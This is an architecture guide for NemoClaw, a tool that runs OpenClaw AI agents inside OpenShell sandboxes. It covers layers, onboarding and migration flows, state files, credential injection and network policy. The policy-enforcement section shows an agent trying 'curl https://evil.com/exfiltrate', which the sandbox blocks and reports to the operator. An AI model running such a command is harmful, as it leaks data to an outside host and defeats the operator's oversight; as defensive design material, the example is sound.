# NemoClaw Architecture Guide

This document provides a comprehensive, self-contained description of NemoClaw's architecture. It covers every layer of the system — from the high-level design philosophy down to individual source files, data flows, and communication protocols. All diagrams are ASCII-based.

---

## Table of Contents

1. [Design Philosophy](#1-design-philosophy)
2. [High-Level Architecture](#2-high-level-architecture)
3. [The Three Layers](#3-the-three-layers)
4. [Component Inventory](#4-component-inventory)
5. [Communication Flows](#5-communication-flows)
6. [Data Models and State](#6-data-models-and-state)
7. [Security Architecture](#7-security-architecture)
8. [Blueprint Lifecycle](#8-blueprint-lifecycle)
9. [Migration Architecture](#9-migration-architecture)
10. [Inference Routing](#10-inference-routing)
11. [Container Architecture](#11-container-architecture)
12. [File-by-File Reference](#12-file-by-file-reference)

---

## 0. How NemoClaw, OpenShell, Docker, and OpenClaw Relate

Before diving into internals, understand the four technologies and their roles:

```
+==================+  +==================+  +==================+  +==================+
|    OpenClaw      |  |    Docker        |  |    OpenShell     |  |    NemoClaw      |
|  (AI Agent)      |  | (Container Eng.) |  | (Security Layer) |  |  (The Glue)      |
|                  |  |                  |  |                  |  |                  |
| - Runs AI tasks  |  | - Hosts          |  | - Adds security  |  | - Orchestrates   |
| - Conversations  |  |   containers     |  |   ON TOP of      |  |   setup          |
| - Calls tools    |  | - Builds images  |  |   Docker         |  | - Builds images  |
| - Writes code    |  | - GPU access     |  | - Policies       |  | - Configures     |
| - Plugin system  |  | - Networking     |  | - Credential mgr |  |   inference      |
|                  |  |                  |  | - Monitoring     |  | - Manages NIM    |
| NOT in this repo |  | NOT in this repo |  | NOT in this repo |  | THIS REPO        |
+==================+  +==================+  +==================+  +==================+
                              ^                      ^
                              |  built on            |
                              +------+  +------------+
                                     |  |
                                     |  | NemoClaw depends on all three
                                     +--+-----------------------------+
```

**The layer cake**: Docker provides raw containers. OpenShell adds security on top
of Docker. NemoClaw orchestrates everything — building Docker images, telling
OpenShell to create sandboxes, and installing OpenClaw inside them.

**Docker's multiple roles**: Docker serves as (1) host for the OpenShell gateway
container, (2) host for the sandbox container where OpenClaw runs, (3) host for
optional NIM inference containers, and (4) image builder for the sandbox image.

**At setup time**: NemoClaw calls both `docker` (for NIM + image building) and
`openshell` (for sandboxes + policies). OpenShell internally calls Docker too.

**At runtime**: Docker is the silent workhorse hosting all containers. OpenShell
enforces security. OpenClaw runs the AI agent. NemoClaw is mostly idle.

For the full deep-dive with diagrams, runtime traces, and FAQ, see
[How NemoClaw, OpenShell, Docker, and OpenClaw Work Together](HOW_THE_THREE_PROJECTS_WORK_TOGETHER.md).

---

## 1. Design Philosophy

NemoClaw follows three core principles:

1. **Security by default** — The sandbox denies all access unless explicitly allowed. Network endpoints, filesystem paths, and syscalls are whitelisted.

2. **Transparent credential injection** — API keys never enter the sandbox. OpenShell injects them at the network proxy layer, invisible to the agent.

3. **Reversible operations** — Every migration creates a snapshot. Every deployment can be rolled back. The host installation is never destroyed.

---

## 2. High-Level Architecture

```
+================================================================+
|                        USER'S HOST MACHINE                      |
|                                                                 |
|  +---------------------------+                                  |
|  |   nemoclaw CLI            |   <-- User runs commands here    |
|  |   (bin/nemoclaw.js)       |                                  |
|  |   Node.js / CommonJS     |                                  |
|  +-------------+-------------+                                  |
|                |                                                |
|                | spawns                                         |
|                v                                                |
|  +---------------------------+                                  |
|  |   OpenClaw Process        |                                  |
|  |   + NemoClaw Plugin       |   <-- TypeScript ESM plugin      |
|  |   (nemoclaw/src/index.ts) |                                  |
|  +-------------+-------------+                                  |
|                |                                                |
|                | subprocess (python3)                           |
|                v                                                |
|  +---------------------------+                                  |
|  |   Blueprint Orchestrator  |   <-- Python 3.11+               |
|  |   (orchestrator/runner.py)|                                  |
|  +-------------+-------------+                                  |
|                |                                                |
|                | openshell CLI commands                         |
|                v                                                |
|  +---------------------------+     +-------------------------+  |
|  |   OpenShell Gateway       |     |   Docker Engine         |  |
|  |   - k3s cluster           |---->|   - Container runtime   |  |
|  |   - Network proxy         |     |   - Image management    |  |
|  |   - Policy engine         |     +-------------------------+  |
|  |   - Credential injector   |                                  |
|  +-------------+-------------+                                  |
|                |                                                |
|                | creates + manages                              |
|                v                                                |
|  +=============+===============================================+|
|  |              SANDBOX CONTAINER                              ||
|  |                                                             ||
|  |  +---------------------+   +-----------------------------+  ||
|  |  |  OpenClaw Agent     |   |  NemoClaw Plugin            |  ||
|  |  |  (always-on AI)     |   |  (pre-installed)            |  ||
|  |  +----------+----------+   +-----------------------------+  ||
|  |             |                                               ||
|  |             | inference request                             ||
|  |             v                                               ||
|  |  +---------------------+                                    ||
|  |  |  OpenShell Gateway  |   <-- Transparent proxy            ||
|  |  |  Proxy (in-sandbox) |       intercepts all requests      ||
|  |  +----------+----------+                                    ||
|  |             |                                               ||
|  +=============+===============================================+|
|                |                                                |
+================|================================================+
                 |
                 | HTTPS (credential injected)
                 v
+================================+
|   NVIDIA Cloud API             |
|   integrate.api.nvidia.com     |
|   (or local NIM / vLLM)       |
+================================+
```

### Key Insight: Two Interface Model

NemoClaw has **two independent interfaces** that work together:

```
+-----------------------------+    +-------------------------------+
|   HOST CLI                  |    |   OPENCLAW PLUGIN             |
|   `nemoclaw <cmd>`          |    |   `openclaw nemoclaw <cmd>`   |
|                             |    |                               |
|   - Pre-sandbox setup       |    |   - In-process commands       |
|   - Gateway management      |    |   - Blueprint lifecycle       |
|   - Sandbox lifecycle       |    |   - Migration logic           |
|   - Service management      |    |   - Status reporting          |
|   - Policy presets          |    |   - Eject/rollback            |
|                             |    |                               |
|   Source: bin/nemoclaw.js   |    |   Source: nemoclaw/src/       |
|   Runtime: Node.js CJS      |    |   Runtime: TypeScript ESM     |
+-----------------------------+    +-------------------------------+
         |                                    |
         |          Both call                 |
         +----------+  +---------------------+
                    |  |
                    v  v
         +-----------------------------+
         |   openshell CLI             |
         |   (subprocess calls)        |
         +-----------------------------+
```

---

## 3. The Three Layers

### Layer 1: Host CLI (`bin/`)

The host CLI is a Node.js script that runs directly on the user's machine. It handles pre-sandbox operations.

```
bin/nemoclaw.js              Entry point, command dispatcher
    |
    +-- bin/lib/runner.js     Shell execution helpers (run, runCapture)
    +-- bin/lib/registry.js   Sandbox metadata (sandboxes.json)
    +-- bin/lib/credentials.js API key storage (credentials.json, mode 600)
    +-- bin/lib/onboard.js    7-step interactive setup wizard
    +-- bin/lib/nim.js        NIM container lifecycle
    +-- bin/lib/policies.js   Network policy preset management
    +-- bin/lib/preflight.js  System validation (Docker, cgroups, GPU)
```

**Entry point**: `bin/nemoclaw.js:306-366`

The dispatcher reads `process.argv`, checks for global commands (`onboard`, `list`, `deploy`, etc.), then falls back to sandbox-scoped commands (`<name> connect`, `<name> status`, etc.).

### Layer 2: TypeScript Plugin (`nemoclaw/src/`)

The plugin runs inside the OpenClaw process. It registers CLI subcommands, slash commands, and inference providers.

```
nemoclaw/src/index.ts         Plugin registration (register function)
    |
    +-- src/cli.ts            Commander.js subcommand wiring
    |   |
    |   +-- commands/launch.ts     Fresh bootstrap
    |   +-- commands/migrate.ts    Host-to-sandbox migration
    |   +-- commands/connect.ts    Interactive shell access
    |   +-- commands/status.ts     Health reporting
    |   +-- commands/logs.ts       Log streaming
    |   +-- commands/eject.ts      Rollback to host
    |   +-- commands/onboard.ts    Inference config wizard
    |
    +-- commands/slash.ts     /nemoclaw chat command handler
    |
    +-- blueprint/resolve.ts  Version resolution + caching
    +-- blueprint/fetch.ts    OCI registry download
    +-- blueprint/verify.ts   SHA-256 digest + compatibility
    +-- blueprint/exec.ts     Python subprocess runner
    +-- blueprint/state.ts    Persistent state (~/.nemoclaw/state/)
    |
    +-- onboard/config.ts     Inference config persistence
    +-- onboard/prompt.ts     Interactive prompts
    +-- onboard/validate.ts   Input validation
```

**Entry point**: `nemoclaw/src/index.ts:179` — The `register(api)` function

### Layer 3: Python Blueprint (`nemoclaw-blueprint/`)

The blueprint orchestrator is a Python script called as a subprocess. It translates high-level actions into `openshell` CLI commands.

```
nemoclaw-blueprint/
    |
    +-- blueprint.yaml         Version, profiles, compatibility
    |
    +-- orchestrator/
    |   +-- runner.py          Plan/apply/status/rollback
    |
    +-- policies/
    |   +-- openclaw-sandbox.yaml   Base security policy
    |   +-- presets/
    |       +-- slack.yaml
    |       +-- discord.yaml
    |       +-- jira.yaml
    |       +-- telegram.yaml
    |       +-- pypi.yaml
    |       +-- npm.yaml
    |       +-- huggingface.yaml
    |       +-- outlook.yaml
    |       +-- docker.yaml
    |
    +-- migrations/
        +-- snapshot.py        Migration state handling
```

**Entry point**: `nemoclaw-blueprint/orchestrator/runner.py:312` — `main()` function

---

## 4. Component Inventory

### 4.1 Plugin Registration Components

```
+-------------------------------------------------------------------+
|  register(api: OpenClawPluginApi)   [index.ts:179]                |
|                                                                    |
|  1. registerCommand("nemoclaw")     --> handleSlashCommand()       |
|     - Chat interface (/nemoclaw in conversations)                  |
|                                                                    |
|  2. registerCli(registrar)          --> registerCliCommands()       |
|     - Terminal interface (openclaw nemoclaw <cmd>)                  |
|                                                                    |
|  3. registerProvider("nvidia-nim")  --> NVIDIA inference provider   |
|     - Models: nemotron-3-super-120b, ultra-253b, super-49b, nano   |
|     - Auth: Bearer token via NVIDIA_API_KEY                        |
+-------------------------------------------------------------------+
```

### 4.2 Blueprint Components

```
+-------------------------------------------------------------------+
|  Blueprint Lifecycle Pipeline                                      |
|                                                                    |
|  resolve.ts -----> fetch.ts -----> verify.ts -----> exec.ts        |
|                                                                    |
|  "Where is      "Download      "Check SHA-256   "Run Python       |
|   the blueprint   from OCI       and version      runner as        |
|   artifact?"      registry"      compatibility"   subprocess"      |
|                                                                    |
|  Cache:                                                            |
|  ~/.nemoclaw/blueprints/<version>/                                 |
+-------------------------------------------------------------------+
```

### 4.3 Host CLI Components

```
+-------------------------------------------------------------------+
|  bin/nemoclaw.js — Command Dispatcher                              |
|                                                                    |
|  GLOBAL_COMMANDS:                                                  |
|    onboard  --> lib/onboard.js (7-step wizard)                     |
|    setup    --> scripts/setup.sh (deprecated)                      |
|    deploy   --> Brev VM deployment                                 |
|    start    --> scripts/start-services.sh                          |
|    stop     --> scripts/start-services.sh --stop                   |
|    status   --> registry.listSandboxes() + service status          |
|    list     --> registry.listSandboxes()                           |
|                                                                    |
|  SANDBOX_COMMANDS (nemoclaw <name> <action>):                      |
|    connect     --> openshell sandbox connect                       |
|    status      --> registry + openshell + NIM health               |
|    logs        --> openshell sandbox logs                          |
|    policy-add  --> policies.applyPreset()                          |
|    policy-list --> policies.listPresets()                           |
|    destroy     --> NIM stop + openshell delete + registry remove   |
+-------------------------------------------------------------------+
```

---

## 5. Communication Flows

### 5.1 Cross-Layer Communication

```
+------------------+          +------------------+          +------------------+
|  Host CLI        |          |  TypeScript      |          |  Python          |
|  (Node.js CJS)  |          |  Plugin (ESM)    |          |  Blueprint       |
|                  |          |                  |          |                  |
|  nemoclaw.js     |  runs    |  index.ts        | spawns   |  runner.py       |
|  onboard.js      |  within  |  cli.ts          | python3  |                  |
|  registry.js     |  same    |  commands/*.ts   | process  |  Communicates    |
|  credentials.js  |  Node    |  blueprint/*.ts  |          |  via stdout:     |
|  nim.js          |  process |  onboard/*.ts    |          |  PROGRESS:N:msg  |
|  policies.js     |          |                  |          |  RUN_ID:id       |
|  preflight.js    |          |                  |          |  exit code       |
+--------+---------+          +--------+---------+          +--------+---------+
         |                             |                             |
         |   openshell CLI             |   openshell CLI             |   openshell CLI
         v                             v                             v
+========================================================================+
|                           OpenShell Runtime                             |
|  openshell gateway start/destroy                                       |
|  openshell sandbox create/connect/status/logs/delete/cp                |
|  openshell provider create/update                                      |
|  openshell inference set/get                                           |
|  openshell policy set                                                  |
|  openshell forward start                                               |
+========================================================================+
```

### 5.2 Onboard Flow (Host CLI)

```
User runs: nemoclaw onboard
         |
         v
[Step 1/7] Preflight checks
         |-- Docker running?
         |-- OpenShell installed?
         |-- cgroup v2 config OK?
         |-- GPU detection (NVIDIA / Apple / none)
         |
         v
[Step 2/7] Start OpenShell gateway
         |-- openshell gateway destroy (cleanup old)
         |-- openshell gateway start --name nemoclaw [--gpu]
         |-- Health check loop (5 retries)
         |-- CoreDNS fix for Colima (if macOS)
         |
         v
[Step 3/7] Create sandbox
         |-- Prompt for sandbox name
         |-- Stage Docker build context (Dockerfile + nemoclaw + blueprint + scripts)
         |-- openshell sandbox create --from Dockerfile --name <name> --policy <base>
         |-- openshell forward start --background 18789
         |-- Register in ~/.nemoclaw/sandboxes.json
         |
         v
[Step 4/7] Configure NIM inference
         |-- Detect local options (vLLM on :8000, Ollama on :11434)
         |-- Present options: NIM, Cloud, Ollama, vLLM
         |-- If NIM: list models by GPU VRAM, pull image, start container
         |-- If Cloud: prompt for NVIDIA_API_KEY
         |
         v
[Step 5/7] Set up inference provider
         |-- openshell provider create --name <provider> --type openai
         |-- openshell inference set --provider <provider> --model <model>
         |
         v
[Step 6/7] OpenClaw setup
         |-- OpenClaw gateway launches inside sandbox
         |
         v
[Step 7/7] Policy presets
         |-- Auto-detect tokens (Telegram, Slack, Discord)
         |-- List available presets with suggestions
         |-- Apply selected presets via openshell policy set
         |
         v
Dashboard printed: sandbox name, model, provider, commands
```

### 5.3 Launch Flow (Plugin)

```
User runs: openclaw nemoclaw launch --profile default
         |
         v
[detect] detectHostOpenClaw()
         |-- Check ~/.openclaw existence
         |-- If exists and no --force: suggest migrate instead
         |-- If not exists and no --force: suggest native OpenShell
         |
         v
[resolve] resolveBlueprint(pluginConfig)
         |-- Check local cache: ~/.nemoclaw/blueprints/<version>/
         |-- If cached: return cached manifest
         |-- If not: fetchBlueprint() from OCI registry
         |
         v
[verify] verifyBlueprintDigest(localPath, manifest)
         |-- computeDirectoryDigest(): SHA-256 of all files
         |-- Compare against manifest.digest
         |-- If mismatch: abort with error
         |
         v
[compat] checkCompatibility(manifest, openshellVersion, openclawVersion)
         |-- satisfiesMinVersion() for OpenShell
         |-- satisfiesMinVersion() for OpenClaw
         |-- If incompatible: abort with version requirements
         |
         v
[plan]   execBlueprint(action="plan", profile)
         |-- spawn python3 runner.py plan --profile default
         |-- runner.py validates profile, checks openshell CLI
         |-- Returns JSON plan with sandbox + inference config
         |-- Communicates via: PROGRESS:N:label, RUN_ID:id
         |
         v
[apply]  execBlueprint(action="apply", profile)
         |-- spawn python3 runner.py apply --profile default
         |-- Step 1: openshell sandbox create --from <image>
         |-- Step 2: openshell provider create --name <provider>
         |-- Step 3: openshell inference set --provider <provider>
         |-- Step 4: Save run state to ~/.nemoclaw/state/runs/<id>/
         |
         v
[state]  saveState({ lastAction: "launch", blueprintVersion, sandboxName })
         |-- Write to ~/.nemoclaw/state/nemoclaw.json
```

### 5.4 Migration Flow (Plugin)

```
User runs: openclaw nemoclaw migrate
         |
         v
[detect] detectHostOpenClaw()
         |-- Locate ~/.openclaw state directory
         |-- Find config (openclaw.json)
         |-- Discover workspace, extensions, skills, hooks dirs
         |-- Detect external roots (symlinked paths outside ~/.openclaw)
         |-- Collect warnings (deprecated config) and errors (unresolvable roots)
         |
         v
[resolve + verify] Same as Launch flow
         |
         v
[plan + apply] Same as Launch flow (create sandbox)
         |
         v
[snapshot] createSnapshotBundle(hostState)
         |-- Create ~/.nemoclaw/snapshots/<timestamp>/
         |-- Copy entire ~/.openclaw tree (preserving symlinks)
         |-- Rewrite config paths for sandbox (/sandbox/.openclaw)
         |-- For each external root:
         |   - Copy directory tree
         |   - Record path mappings
         |   - Preserve symlink structure
         |-- Write manifest.json
         |
         v
[archive] buildMigrationArchives(bundle)
         |-- tar state directory -> state.tar
         |-- tar each external root -> <rootId>.tar
         |
         v
[sync]   syncSnapshotBundleIntoSandbox(bundle, sandboxName)
         |-- openshell sandbox cp state.tar -> /sandbox/.nemoclaw/migration/archives/
         |-- openshell sandbox connect -- sh -lc "tar -xf ..."
         |-- For each external root: same cp + extract
         |
         v
[verify] verifySandboxMigration(bundle, sandboxName)
         |-- Execute Node.js verification script INSIDE sandbox
         |-- Check: state dir exists
         |-- Check: config paths rewritten correctly
         |-- Check: external roots exist
         |-- Check: symlinks preserved
         |
         v
[state]  saveState({ lastAction: "migrate", migrationSnapshot })
```

### 5.5 Eject (Rollback) Flow

```
User runs: openclaw nemoclaw eject --confirm
         |
         v
[check]  loadState()
         |-- Verify lastAction exists
         |-- Verify migrationSnapshot or hostBackupPath exists
         |-- Verify snapshot directory exists on disk
         |
         v
[rollback] execBlueprint(action="rollback", runId)
         |-- python3 runner.py rollback --run-id <id>
         |-- openshell sandbox stop <name>
         |-- openshell sandbox remove <name>
         |-- Mark run as rolled back
         |
         v
[restore] restoreSnapshotToHost(snapshotPath)
         |-- Extract snapshot archives back to host paths
         |-- Restore original config path mappings
         |
         v
[cleanup] clearState()
         |-- Reset ~/.nemoclaw/state/nemoclaw.json
```

### 5.6 Inference Request Flow (Runtime)

```
+-----------------------------------+
|  Sandbox Container                |
|                                   |
|  OpenClaw Agent                   |
|  "Generate a response"            |
|       |                           |
|       | HTTP POST to              |
|       | https://inference.local/v1|
|       v                           |
|  +-----------------------------+  |
|  | OpenShell Gateway Proxy     |  |
|  | (transparent to agent)      |  |
|  +-------------+---------------+  |
+-----------------|------------------+
                  |
                  | Proxy intercepts,
                  | injects API key from
                  | provider config,
                  | rewrites URL
                  v
+-----------------------------------------+
|  Network Policy Check                    |
|  Is integrate.api.nvidia.com allowed?    |
|  YES -> forward with credentials        |
|  NO  -> block, surface in TUI           |
+-----------------------------------------+
                  |
                  v
+-----------------------------------------+
|  NVIDIA Cloud API                        |
|  https://integrate.api.nvidia.com/v1     |
|  POST /chat/completions                  |
|  Authorization: Bearer nvapi-***         |
|                                          |
|  Response flows back through proxy       |
+-----------------------------------------+
```

### 5.7 Policy Enforcement Flow

```
Agent tries: curl https://evil.com/exfiltrate

         |
         v
+----------------------------+
|  Network Namespace         |
|  (sandbox-scoped)          |
|                            |
|  Is evil.com in policy?    |  --> NO
|                            |
+----------------------------+
         |
         v
+----------------------------+
|  Request BLOCKED           |
|                            |
|  Logged to OpenShell TUI   |
|  Operator sees:            |
|    "evil.com:443 DENIED"   |
|                            |
|  Operator can:             |
|    - Approve (one-time)    |
|    - Add to policy (perm)  |
+----------------------------+
```

---

## 6. Data Models and State

### 6.1 State File Locations

```
~/.nemoclaw/
    |
    +-- state/
    |   +-- nemoclaw.json          Plugin run state
    |   +-- runs/
    |       +-- nc-20260315-.../
    |           +-- plan.json      Saved deployment plan
    |
    +-- config.json                Onboard inference configuration
    |
    +-- credentials.json           API keys (mode 0600)
    |
    +-- sandboxes.json             Host CLI sandbox registry
    |
    +-- blueprints/
    |   +-- 0.1.0/                 Cached blueprint v0.1.0
    |       +-- blueprint.yaml
    |       +-- orchestrator/
    |       +-- policies/
    |
    +-- snapshots/
        +-- 2026-03-15T.../        Migration snapshot
            +-- manifest.json
            +-- openclaw/          Backed-up ~/.openclaw
            +-- archives/
                +-- state.tar
                +-- ext-root-1.tar
```

### 6.2 Plugin State Schema

File: `~/.nemoclaw/state/nemoclaw.json`

```
{
  "lastRunId":          "nc-20260315-143022-a1b2c3d4",  // Unique run ID
  "lastAction":         "migrate",                       // launch | migrate | eject
  "blueprintVersion":   "0.1.0",                         // Blueprint version used
  "sandboxName":        "openclaw",                       // Sandbox name
  "migrationSnapshot":  "/home/user/.nemoclaw/snapshots/2026-03-15T...",
  "hostBackupPath":     "/home/user/.nemoclaw/snapshots/2026-03-15T...",
  "createdAt":          "2026-03-15T14:30:22.000Z",
  "updatedAt":          "2026-03-15T14:30:22.000Z"
}
```

Source: `nemoclaw/src/blueprint/state.ts`

### 6.3 Onboard Config Schema

File: `~/.nemoclaw/config.json`

```
{
  "endpointType":   "build",                              // build | ncp | nim-local | vllm | ollama | custom
  "endpointUrl":    "https://integrate.api.nvidia.com/v1",
  "ncpPartner":     null,                                  // NCP partner name (if applicable)
  "model":          "nvidia/nemotron-3-super-120b-a12b",
  "profile":        "default",                             // Blueprint profile
  "credentialEnv":  "NVIDIA_API_KEY",                      // Env var name for API key
  "onboardedAt":    "2026-03-15T14:30:22.000Z"
}
```

Source: `nemoclaw/src/onboard/config.ts`

### 6.4 Sandbox Registry Schema

File: `~/.nemoclaw/sandboxes.json`

```
{
  "defaultSandbox": "my-assistant",
  "sandboxes": [
    {
      "name":         "my-assistant",
      "createdAt":    "2026-03-15T14:30:22.000Z",
      "model":        "nvidia/nemotron-3-super-120b-a12b",
      "nimContainer": null,
      "provider":     "nvidia-nim",
      "gpuEnabled":   false,
      "policies":     ["pypi", "npm", "telegram"]
    }
  ]
}
```

Source: `bin/lib/registry.js`

### 6.5 Blueprint Manifest Schema

File: `nemoclaw-blueprint/blueprint.yaml`

```yaml
version: "0.1.0"
min_openshell_version: "0.1.0"
min_openclaw_version: "2026.3.0"
digest: ""                        # SHA-256, computed at release time

profiles:
  - default                       # NVIDIA Cloud API
  - ncp                           # NCP partner endpoint
  - nim-local                     # Local NIM container
  - vllm                          # Local vLLM

components:
  sandbox:
    image: "ghcr.io/nvidia/openshell-community/sandboxes/openclaw:latest"
    name: "openclaw"
    forward_ports: [18789]

  inference:
    profiles:
      default:
        provider_type: "nvidia"
        endpoint: "https://integrate.api.nvidia.com/v1"
        model: "nvidia/nemotron-3-super-120b-a12b"
      # ... (ncp, nim-local, vllm)

  policy:
    base: "sandboxes/openclaw/policy.yaml"
    additions:
      nim_service:
        endpoints:
          - host: "nim-service.local"
            port: 8000
```

Source: `nemoclaw-blueprint/blueprint.yaml`

### 6.6 Migration Snapshot Manifest

```
{
  "version": "1",
  "timestamp": "2026-03-15T14:30:22.000Z",
  "hostState": {
    "stateDir": "/home/user/.openclaw",
    "configPath": "/home/user/.openclaw/openclaw.json",
    "workspaceDir": "/home/user/.openclaw/workspaces",
    "extensionsDir": "/home/user/.openclaw/extensions",
    "externalRoots": [
      {
        "id": "workspace-myproject",
        "kind": "workspace",
        "sourcePath": "/home/user/projects/myproject",
        "sandboxPath": "/sandbox/workspaces/myproject",
        "bindings": [{ "configPath": "workspaces[0].path" }],
        "symlinkPaths": ["node_modules/.cache"]
      }
    ]
  },
  "archivePaths": {
    "state": "archives/state.tar",
    "workspace-myproject": "archives/workspace-myproject.tar"
  }
}
```

Source: `nemoclaw/src/commands/migration-state.ts`

---

## 7. Security Architecture

### 7.1 Defense-in-Depth Model

```
+------------------------------------------------------------+
|  Layer 5: Inference Routing                                |
|  - All model calls routed through OpenShell gateway        |
|  - Agent never sees API keys                               |
|  - Configurable per-provider, hot-reloadable               |
+------------------------------------------------------------+
|  Layer 4: Network Policy                                   |
|  - Declarative YAML allowlist                              |
|  - Per-endpoint: host, port, method, path rules            |
|  - Per-binary restrictions (only curl can reach X)         |
|  - Hot-reloadable at runtime                               |
+------------------------------------------------------------+
|  Layer 3: Process Isolation                                |
|  - Runs as unprivileged "sandbox" user                     |
|  - seccomp syscall filtering                               |
|  - No root capabilities                                    |
+------------------------------------------------------------+
|  Layer 2: Filesystem Isolation (Landlock)                  |
|  - Read-only: /usr, /lib, /proc, /app, /etc               |
|  - Read-write: /sandbox, /tmp, /dev/null                   |
|  - All other paths denied                                  |
+------------------------------------------------------------+
|  Layer 1: Container Isolation (Docker + k3s)               |
|  - Network namespace (no host network access)              |
|  - PID namespace                                           |
|  - UID/GID restrictions                                    |
+------------------------------------------------------------+
```

### 7.2 Credential Flow

```
User provides API key
         |
         v
Stored in ~/.nemoclaw/credentials.json (mode 0600)
         |
         v
Passed to openshell provider create --credential "NVIDIA_API_KEY=nvapi-..."
         |
         v
OpenShell stores credential in its own secure config
         |
         v
When sandbox makes inference request:
  1. Request goes to https://inference.local/v1 (inside sandbox)
  2. OpenShell proxy intercepts
  3. Proxy injects Authorization: Bearer <key>
  4. Proxy forwards to real endpoint (integrate.api.nvidia.com)
  5. Response returns to sandbox

The sandbox never sees the actual API key.
```

### 7.3 Network Policy Structure

File: `nemoclaw-blueprint/policies/openclaw-sandbox.yaml`

```
version: 1

filesystem_policy:              # Landlock rules
  read_only:  [/usr, /lib, ...]
  read_write: [/sandbox, /tmp]

process:                        # Process isolation
  run_as_user: sandbox

network_policies:               # Per-service allowlists
  claude_code:
    endpoints:
      - host: api.anthropic.com
        port: 443
        rules:
          - allow: { method: "*", path: "/**" }
    binaries:
      - { path: /usr/local/bin/claude }

  nvidia:
    endpoints:
      - host: integrate.api.nvidia.com
        port: 443
    binaries:
      - { path: /usr/local/bin/claude }
      - { path: /usr/local/bin/openclaw }

  github:
    endpoints:
      - host: github.com
        port: 443
      - host: api.github.com
        port: 443
    binaries:
      - { path: /usr/bin/gh }
      - { path: /usr/bin/git }
```

---

## 8. Blueprint Lifecycle

```
+----------+     +---------+     +--------+     +--------+     +---------+
|  RESOLVE |---->| FETCH   |---->| VERIFY |---->| PLAN   |---->| APPLY   |
+----------+     +---------+     +--------+     +--------+     +---------+
     |                |               |              |              |
     |  Check local   |  Download     |  SHA-256     |  Validate    |  Create
     |  cache first   |  from OCI     |  digest      |  profile,    |  sandbox,
     |                |  registry     |  check       |  check       |  set up
     |  Source:       |               |              |  prereqs,    |  provider,
     |  resolve.ts   |  Source:      |  Source:     |  generate    |  route
     |                |  fetch.ts     |  verify.ts   |  JSON plan   |  inference
     |                |               |              |              |
     |                |               |              |  Source:     |  Source:
     |                |               |              |  runner.py   |  runner.py
     |                |               |              |  action_plan |  action_apply
+----------+     +---------+     +--------+     +--------+     +---------+


Rollback (reverse):

+---------+     +--------+     +---------+
| ROLLBACK|---->| RESTORE|---->| CLEANUP |
+---------+     +--------+     +---------+
     |               |              |
     |  Stop sandbox |  Extract     |  Clear
     |  Remove from  |  snapshot    |  state
     |  OpenShell    |  archives    |  file
     |               |  to host     |
     |  Source:      |              |
     |  runner.py    |  Source:     |  Source:
     |  action_      |  eject.ts   |  state.ts
     |  rollback     |              |  clearState()
```

### Version Compatibility Algorithm

Source: `nemoclaw/src/blueprint/verify.ts:59-69`

```typescript
function satisfiesMinVersion(actual: string, minimum: string): boolean {
  // Split "2.3.1" into [2, 3, 1]
  const aParts = actual.split(".").map(Number);
  const mParts = minimum.split(".").map(Number);
  // Compare left-to-right: if actual > minimum at any position, return true
  // If actual < minimum at any position, return false
  // If all equal, return true (equal satisfies minimum)
}
```

### Directory Digest Algorithm

Source: `nemoclaw/src/blueprint/verify.ts:71-95`

```typescript
function computeDirectoryDigest(dirPath: string): string {
  // 1. Recursively collect all file paths in directory
  // 2. Sort alphabetically (deterministic order)
  // 3. For each file: hash.update(relativePath) + hash.update(fileContent)
  // 4. Return SHA-256 hex digest
}
```

---

## 9. Migration Architecture

### What Gets Migrated

```
HOST (before)                          SANDBOX (after)
~/.openclaw/                    -->    /sandbox/.openclaw/
  +-- openclaw.json                      +-- openclaw.json (paths rewritten)
  +-- agents/                            +-- agents/
  +-- workspaces/                        +-- workspaces/
  +-- extensions/                        +-- extensions/
  +-- skills/                            +-- skills/
  +-- hooks/                             +-- hooks/

~/projects/myproject/           -->    /sandbox/workspaces/myproject/
  (external root via symlink)            (tar-archived, symlinks preserved)
```

### Path Rewriting

The migration rewrites all absolute paths in `openclaw.json` from host paths to sandbox paths:

```
Before: "/home/user/projects/myproject"
After:  "/sandbox/workspaces/myproject"
```

This is done by:
1. Parsing `openclaw.json`
2. Walking the config tree for known path keys (workspaces, extensions, skills)
3. Replacing host paths with `/sandbox/` equivalents
4. Writing the modified config into the snapshot

### Verification Script

After syncing archives into the sandbox, NemoClaw runs a Node.js verification script *inside* the sandbox to confirm:
1. State directory exists at `/sandbox/.openclaw`
2. Config file is parseable
3. All config path bindings point to correct sandbox paths
4. All external roots exist at their sandbox paths
5. All symlinks are preserved

Source: `nemoclaw/src/commands/migrate.ts:221-266`

---

## 10. Inference Routing

### Provider Architecture

```
+-----------------+     +------------------+     +-------------------+
|  Agent makes    |     |  OpenShell       |     |  External         |
|  API call to    |---->|  Gateway Proxy   |---->|  API Endpoint     |
|  inference.local|     |                  |     |                   |
+-----------------+     |  1. Match route  |     |  Examples:        |
                        |  2. Inject creds |     |  - nvidia cloud   |
                        |  3. Rewrite URL  |     |  - local NIM      |
                        |  4. Forward      |     |  - local vLLM     |
                        +------------------+     |  - Ollama         |
                                                 +-------------------+
```

### Profile Comparison

```
Profile     Provider Type    Endpoint                              Credential Env
--------    -------------    ------------------------------------  ---------------
default     nvidia           https://integrate.api.nvidia.com/v1   NVIDIA_API_KEY
ncp         nvidia           (dynamic, per partner)                NVIDIA_API_KEY
nim-local   openai           http://nim-service.local:8000/v1      NIM_API_KEY
vllm        openai           http://localhost:8000/v1              OPENAI_API_KEY
```

### Model Catalog

Source: `nemoclaw/src/index.ts:210-235`

| Model ID | Label | Context Window | Max Output |
|---|---|---|---|
| `nvidia/nemotron-3-super-120b-a12b` | Nemotron 3 Super 120B | 131,072 | 8,192 |
| `nvidia/llama-3.1-nemotron-ultra-253b-v1` | Nemotron Ultra 253B | 131,072 | 4,096 |
| `nvidia/llama-3.3-nemotron-super-49b-v1.5` | Nemotron Super 49B v1.5 | 131,072 | 4,096 |
| `nvidia/nemotron-3-nano-30b-a3b` | Nemotron 3 Nano 30B | 131,072 | 4,096 |

---

## 11. Container Architecture

### Dockerfile Layers

Source: `Dockerfile`

```
+-------------------------------------------------------+
|  Layer 1: Base Image                                   |
|  FROM node:22-slim                                     |
+-------------------------------------------------------+
|  Layer 2: System Dependencies                          |
|  python3, pip3, curl, git, ca-certificates, iproute2  |
+-------------------------------------------------------+
|  Layer 3: Sandbox User                                 |
|  groupadd sandbox, useradd sandbox                     |
|  HOME=/sandbox                                         |
+-------------------------------------------------------+
|  Layer 4: OpenClaw CLI                                 |
|  npm install -g openclaw@2026.3.11                     |
+-------------------------------------------------------+
|  Layer 5: PyYAML                                       |
|  pip3 install pyyaml                                   |
+-------------------------------------------------------+
